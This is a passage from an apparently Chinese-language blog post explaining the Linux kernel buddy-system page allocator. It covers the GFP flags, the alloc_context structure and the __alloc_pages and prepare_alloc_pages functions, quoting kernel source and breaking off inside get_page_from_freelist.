class="keyword">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125; _struct_page_alignment;</span><br></pre></td></tr></table></figure><p>page 结构体中的 <code>lru</code> 这一字段的类型为 <code>struct list_head</code>，这是内核编程中通用的双向链表结构，<code>free_list</code>与<code>lru</code>链表都使用该字段将页结构体组织为双向链表，即一个页是不可能同时出现在<code>lru</code>链表与<code>buddy system</code>中的。</p><p>并且可以明确看到这里是按照迁移类型进行分类的，具体前面提到过这里不详细写了。</p><h2 id="buddy-system页分配"><a href="#buddy-system页分配" class="headerlink" title="buddy system页分配"></a>buddy system页分配</h2><h3 id="GFP-get-free-page-标识位"><a href="#GFP-get-free-page-标识位" class="headerlink" title="GFP (get free page) 标识位"></a>GFP (get free page) 标识位</h3><p>在 kernel memory allocation 中我们经常能见到 <code>gfp_t</code> 类型，其表示分配时的标志位。</p><ul><li>内存管理区修饰符: 内存管理区修饰符主要描述从哪些内存管理区来分配内存</li></ul><table><thead><tr><th>flag</th><th>description</th></tr></thead><tbody><tr><td>__GFP_DMA</td><td>从ZONE_DMA区中分配内存</td></tr><tr><td>__GFP_HIGNMEM</td><td>从ZONE_HIGHMEM区中分配内存</td></tr><tr><td>__GFP_DMA32</td><td>从ZONE_DMA32区中分配内存</td></tr><tr><td>__GFP_MOVABLE</td><td>内存规整时可以迁移或回收页面</td></tr></tbody></table><ul><li>移动和替换修饰符: 移动和替换修饰符主要表示分配出来的页面具有的迁移属性</li></ul><table><thead><tr><th>flag</th><th>description</th></tr></thead><tbody><tr><td>__GFP_RECLAIMABLE</td><td>分配的内存页面可以回收</td></tr><tr><td>__GFP_WRITE</td><td>申请的页面会被弄成脏页</td></tr><tr><td>__GFP_HARDWALL</td><td>强制使用cpuset内存分配策略</td></tr><tr><td>__GFP_THISNODE</td><td>在指定的节点上分配内存</td></tr><tr><td>__GFP_ACCOUNT</td><td>kmemcg会记录分配过程</td></tr></tbody></table><ul><li>水位修饰符: 与水位线相关的标志位</li></ul><table><thead><tr><th>flag</th><th>description</th></tr></thead><tbody><tr><td>__GFP_ATOMIC</td><td>高优先级分配内存，分配器可以分配最低警戒水位线下的预留内存</td></tr><tr><td>__GFP_HIGH</td><td>分配内存的过程中不可以睡眠或执行页面回收动作</td></tr><tr><td>__GFP_MEMALLOC</td><td>允许访问所有的内存</td></tr><tr><td>__GFP_NOMEMALLOC</td><td>不允许访问最低警戒水位线下的系统预留内存</td></tr></tbody></table><ul><li>页面回收修饰符: 与页面回收相关的标志位</li></ul><table><thead><tr><th>flag</th><th>description</th></tr></thead><tbody><tr><td>__GFP_IO</td><td>启动物理I&#x2F;O传输</td></tr><tr><td>__GFP_FS</td><td>允许调用底层FS文件系统。可避免分配器递归到可能已经持有锁的文件系统中， 避免死锁</td></tr><tr><td>__GFP_DIRECT_RECLAIM</td><td>分配内存过程中可以使用直接内存回收</td></tr><tr><td>__GFP_KSWAPD_RECLAIM</td><td>内存到达低水位时唤醒kswapd线程异步回收内存</td></tr><tr><td>__GFP_RECLAIM</td><td>表示是否可以直接内存回收或者使用kswapd线程进行回收</td></tr><tr><td>__GFP_RETRY_MAYFAIL</td><td>分配内存可以可能会失败，但是在申请过程中会回收一些不必要的内存，是整个系统受益</td></tr><tr><td>__GFP_NOFAIL</td><td>内存分配失败后无限制的重复尝试，知道分配成功</td></tr><tr><td>__GFP_NORETRY</td><td>直接页面回收或者内存规整后还是无法分配内存时，不启用retry反复尝试分配内存，直接返回NULL</td></tr></tbody></table><ul><li>行为修饰符: 与分配时的行为相关的标志位</li></ul><table><thead><tr><th>flag</th><th>description</th></tr></thead><tbody><tr><td>__GFP_NOWARN</td><td>关闭内存分配过程中的WARNING</td></tr><tr><td>__GFP_COMP</td><td>分配的内存页面将被组合成复合页compound page</td></tr><tr><td>__GFP_ZERO</td><td>返回一个全部填充为0的页面</td></tr></tbody></table><ul><li>组合类型标志: 前面描述的修饰符种过于繁多，因此linux定义了一些组合的类型标志，供开发者使用</li></ul><table><thead><tr><th>flag</th><th>element</th><th>description</th></tr></thead><tbody><tr><td>GFP_ATOMIC</td><td>__GFP_HIGH|__GFP_ATOMIC|__GFP_KSWAPD_RECLAIM</td><td>分配过程不能休眠，分配具有高优先级，可以访问系统预留内存</td></tr><tr><td>GFP_KERNEL</td><td>__GFP_RECLAIM|__GFP_IO|__GFP_FS</td><td>分配内存时可以被阻塞(即休眠)</td></tr><tr><td>GFP_KERNEL_ACCOUNT</td><td>GFP_KERNEL|__GFP_ACCOUNT</td><td>和GFP_KERNEL作用一样，但是分配的过程会被kmemcg记录</td></tr><tr><td>GFP_NOWAIT</td><td>__GFP_KSWAPD_RECLAIM</td><td>分配过程中不允许因直接内存回收而导致停顿</td></tr><tr><td>GFP_NOIO</td><td>__GFP_RECLAIM</td><td>不需要启动任何的I&#x2F;O操作</td></tr><tr><td>GFP_NOFS</td><td>__GFP_RECLAIM |__GFP_IO</td><td>不会有访问任何文件系统的操作</td></tr><tr><td>GFP_USER</td><td>__GFP_RECLAIM|__GFP_IO|__GFP_FS|__GFP_HARDWALL</td><td>用户空间的进程分配内存</td></tr><tr><td>GFP_DMA</td><td>__GFP_DMA</td><td>从ZONE_DMA区分配内存</td></tr><tr><td>GFP_DMA32</td><td>__GFP_DMA32</td><td>从ZONE_DMA32区分配内存</td></tr><tr><td>GFP_HIGHUSER</td><td>GFP_USER|__GFP_HIGHMEM</td><td>用户进程分配内存，优先使用ZONE_HIGHMEM， 且这些页面不允许迁移</td></tr><tr><td>GFP_HIGHUSER_MOVABLE</td><td>GFP_HIGHUSER|__GFP_MOVABLE</td><td>和GFP_HIGHUSER类似，但是页面可以迁移</td></tr><tr><td>GFP_TRANSHUGE_LIGHT</td><td>(GFP_HIGHUSER_MOVABLE|__GFP_COMP|__GFP_NOMEMALLOC|__GFP_NOWARN)&amp; ~__GFP_RECLAIM</td><td>透明大页的内存分配， light表示不进行内存压缩和回收</td></tr><tr><td>GFP_TRANSHUGE</td><td>GFP_TRANSHUGE_LIGHT|__GFP_DIRECT_RECLAIM</td><td>和GFP_TRANSHUGE_LIGHT类似，通常khugepaged使用该标志</td></tr></tbody></table><h2 id="alloc-context结构体"><a href="#alloc-context结构体" class="headerlink" title="alloc_context结构体"></a>alloc_context结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> *<span class="title">zonelist</span>;</span></span><br><span class="line"><span class="keyword">nodemask_t</span> *nodemask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">preferred_zoneref</span>;</span></span><br><span class="line"><span class="keyword">int</span> migratetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * highest_zoneidx represents highest usable zone index of</span></span><br><span class="line"><span class="comment"> * the allocation request. Due to the nature of the zone,</span></span><br><span class="line"><span class="comment"> * memory on lower zone than the highest_zoneidx will be</span></span><br><span class="line"><span class="comment"> * protected by lowmem_reserve[highest_zoneidx].</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * highest_zoneidx is also used by reclaim/compaction to limit</span></span><br><span class="line"><span class="comment"> * the target zone since higher zone than this index cannot be</span></span><br><span class="line"><span class="comment"> * usable for this allocation request.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">highest_zoneidx</span>;</span></span><br><span class="line"><span class="keyword">bool</span> spread_dirty_pages;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是一个分配过程中非常重要的结构体，用来表示我们单次内存分配的上下文信息。</p><p>这里主要关注的是其中的一个成员<code>zonelist</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该成员表示在这一次的分配上下文中，我们将要操作的 zone 的列表，其为一个 <code>zonelist</code> 类型的结构体数组。可以看到的是其为一个 <code>zoneref</code> 类型的结构体数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span><span class="comment">/* Pointer to actual zone */</span></span><br><span class="line"><span class="keyword">int</span> zone_idx;<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而这个结构体在上文中提过，包含了一个 zone 的指针以及一个 index。</p><p>随后再看<code>alloc_context</code>结构体中的<code>preferred_zoneref</code>成员，该成员为一个 <code>zoneref</code> 类型的结构体，表示优先用来进行分配的 zone。</p><p>最后则是<code>spread_dirty_pages</code>成员，表示此次分配是否可能产生脏页（需要进行写回），通常分配需要写入的页会出现。</p><h2 id="alloc-pages函数"><a href="#alloc-pages函数" class="headerlink" title="__alloc_pages函数"></a>__alloc_pages函数</h2><p>此函数为<code>buddy system</code>分配页面的核心函数，所有的页面分配 API 都是基于该函数的封装。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">alloc_pages</span>(<span class="title">gfp_t</span> <span class="title">gfp</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">preferred_nid</span>,</span></span><br><span class="line"><span class="class"><span class="title">nodemask_t</span> *<span class="title">nodemask</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags = ALLOC_WMARK_LOW;</span><br><span class="line"><span class="keyword">gfp_t</span> alloc_gfp; <span class="comment">/* The gfp_t that was actually used for allocation */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> <span class="title">ac</span> =</span> &#123; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * There are several places where we assume that the order value is sane</span></span><br><span class="line"><span class="comment"> * so bail out early if the request is out of bound.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE_GFP(order &gt; MAX_ORDER, gfp))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">gfp &amp;= gfp_allowed_mask;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Apply scoped allocation constraints. This is mainly about GFP_NOFS</span></span><br><span class="line"><span class="comment"> * resp. GFP_NOIO which has to be inherited for all allocation requests</span></span><br><span class="line"><span class="comment"> * from a particular context which has been marked by</span></span><br><span class="line"><span class="comment"> * memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;. And PF_MEMALLOC_PIN which ensures</span></span><br><span class="line"><span class="comment"> * movable zones are not used during allocation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">gfp = current_gfp_context(gfp);</span><br><span class="line">alloc_gfp = gfp;</span><br><span class="line"><span class="keyword">if</span> (!prepare_alloc_pages(gfp, order, preferred_nid, nodemask, &amp;ac,</span><br><span class="line">&amp;alloc_gfp, &amp;alloc_flags))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Forbid the first pass from falling back to types that fragment</span></span><br><span class="line"><span class="comment"> * memory until all local zones are considered.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* First allocation attempt */</span></span><br><span class="line">page = get_page_from_freelist(alloc_gfp, order, alloc_flags, &amp;ac);</span><br><span class="line"><span class="keyword">if</span> (likely(page))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">alloc_gfp = gfp;</span><br><span class="line">ac.spread_dirty_pages = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Restore the original nodemask if it was potentially replaced with</span></span><br><span class="line"><span class="comment"> * &amp;cpuset_current_mems_allowed to optimize the fast-path attempt.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac.nodemask = nodemask;</span><br><span class="line"></span><br><span class="line">page = __alloc_pages_slowpath(alloc_gfp, order, &amp;ac);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (memcg_kmem_online() &amp;&amp; (gfp &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;</span><br><span class="line">    unlikely(__memcg_kmem_charge_page(page, gfp, order) != <span class="number">0</span>)) &#123;</span><br><span class="line">__free_pages(page, order);</span><br><span class="line">page = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trace_mm_page_alloc(page, order, alloc_gfp, ac.migratetype);</span><br><span class="line">kmsan_alloc_page(page, order, alloc_gfp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__alloc_pages);</span><br></pre></td></tr></table></figure><p>函数需要传入四个参数，分别是<code>gfp</code>分配行为参数、<code>order</code>分配的物理页框的阶、<code>preferred_nid</code>选取的节点id、<code>nodemask</code>分配时可供候选的node掩码。</p><p>因为在前面的文章中已经提到过了内存分配，不过只是从slab中分配我们也大概清楚内存分配函数一般的流程，这里也不例外。首先，检查参数合法性，并做分配前准备工作。随后进行快速分配，成功则直接返回结果。最后，若快速分配失败，则进行慢速分配。</p><p>接下来就继续细致的开始分析函数了，进入函数会先检验<code>order</code>是否超过了<code>MAX_ORDER</code>。随后会进入到<code>prepare_alloc_pages</code>函数进行分配前的准备工作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">prepare_alloc_pages</span><span class="params">(<span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> preferred_nid, <span class="keyword">nodemask_t</span> *nodemask,</span></span></span><br><span class="line"><span class="params"><span class="function">struct alloc_context *ac, <span class="keyword">gfp_t</span> *alloc_gfp,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> *alloc_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ac-&gt;highest_zoneidx = gfp_zone(gfp_mask);</span><br><span class="line">ac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask);</span><br><span class="line">ac-&gt;nodemask = nodemask;</span><br><span class="line">ac-&gt;migratetype = gfp_migratetype(gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cpusets_enabled()) &#123;</span><br><span class="line">*alloc_gfp |= __GFP_HARDWALL;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When we are in the interrupt context, it is irrelevant</span></span><br><span class="line"><span class="comment"> * to the current task context. It means that any node ok.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (in_task() &amp;&amp; !ac-&gt;nodemask)</span><br><span class="line">ac-&gt;nodemask = &amp;cpuset_current_mems_allowed;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*alloc_flags |= ALLOC_CPUSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">might_alloc(gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (should_fail_alloc_page(gfp_mask, order))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">*alloc_flags = gfp_to_alloc_flags_cma(gfp_mask, *alloc_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dirty zone balancing only done in the fast path */</span></span><br><span class="line">ac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The preferred zone is used for statistics but crucially it is</span></span><br><span class="line"><span class="comment"> * also used as the starting point for the zonelist iterator. It</span></span><br><span class="line"><span class="comment"> * may get reset for allocations that ignore memory policies.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先调用<code>node_zonelist</code>函数从<code>preferred_nid</code>参数指定的node中获取一个<code>zonelist</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NODE_DATA(nid)(node_data[nid])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct zonelist *<span class="title">node_zonelist</span><span class="params">(<span class="keyword">int</span> nid, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> NODE_DATA(nid)-&gt;node_zonelists + gfp_zonelist(flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行 cpuset 相关判断与标志位设置，若是在中断上下文则直接将 nodemask 设为 <code>cpuset_current_mems_allowed</code>。</p><p>最后调用 <code>first_zones_zonelist()</code> 设置<code>preferred zone</code>，大概是在<code>zonelist</code>中<code>nodemask</code>所包含的zone中 <code>highest_zoneidx</code> 以下的第一个 zone。</p><p>总的来说这个函数主要做的事就是分配前的一些准备的工作，包括初始化 <code>alloc_context</code> 结构体、获取 zone 数组等。</p><h3 id="get-page-from-freelist函数"><a href="#get-page-from-freelist函数" class="headerlink" title="get_page_from_freelist函数"></a>get_page_from_freelist函数</h3><p>根据<code>__alloc_pages</code>函数的流程，接下来进入的就是<code>get_page_from_freelist</code>函数了，而这一函数就是前面提到的快速分配路径了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct page *</span></span><br><span class="line"><span class="function"><span class="title">get_page_from_freelist</span><span class="params">(<span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">int</span> alloc_flags,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct alloc_context *ac)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">z</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> *<span class="title">last_pgdat</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">bool</span> last_pgdat_dirty_ok = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">bool</span> no_fallback;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Scan zonelist, looking for a zone with enough free.</span></span><br><span class="line"><span class="comment"> * See also cpuset_node_allowed() comment in kernel/cgroup/cpuset.c.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT;</span><br><span class="line">z = ac-&gt;preferred_zoneref;</span><br><span class="line">for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,</span><br><span class="line">ac-&gt;nodemask) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mark;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cpusets_enabled() &amp;&amp;</span><br><span class="line">(alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;</span><br><span class="line">!__cpuset_zone_allowed(zone, gfp_mask))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When allocating a page cache page for writing, we</span></span><br><span class="line"><span class="comment"> * want to get it from a node that is within its dirty</span></span><br><span class="line"><span class="comment"> * limit, such that no single node holds more than its</span></span><br><span class="line"><span class="comment"> * proportional share of globally allowed dirty pages.</span></span><br><span class="line"><span class="comment"> * The dirty limits take into account the node&#x27;s</span></span><br><span class="line"><span class="comment"> * lowmem reserves and high watermark so that kswapd</span></span><br><span class="line"><span class="comment"> * should be able to balance it without having to</span></span><br><span class="line"><span class="comment"> * write pages from its LRU list.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">XXX:</span> For now, allow allocations to potentially</span></span><br><span class="line"><span class="comment"> * exceed the per-node dirty limit in the slowpath</span></span><br><span class="line"><span class="comment"> * (spread_dirty_pages unset) before going into reclaim,</span></span><br><span class="line"><span class="comment"> * which is important when on a NUMA setup the allowed</span></span><br><span class="line"><span class="comment"> * nodes are together not big enough to reach the</span></span><br><span class="line"><span class="comment"> * global limit.  The proper fix for these situations</span></span><br><span class="line"><span class="comment"> * will require awareness of nodes in the</span></span><br><span class="line"><span class="comment"> * dirty-throttling and the flusher threads.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ac-&gt;spread_dirty_pages) &#123;</span><br><span class="line"><span class="keyword">if</span> (last_pgdat != 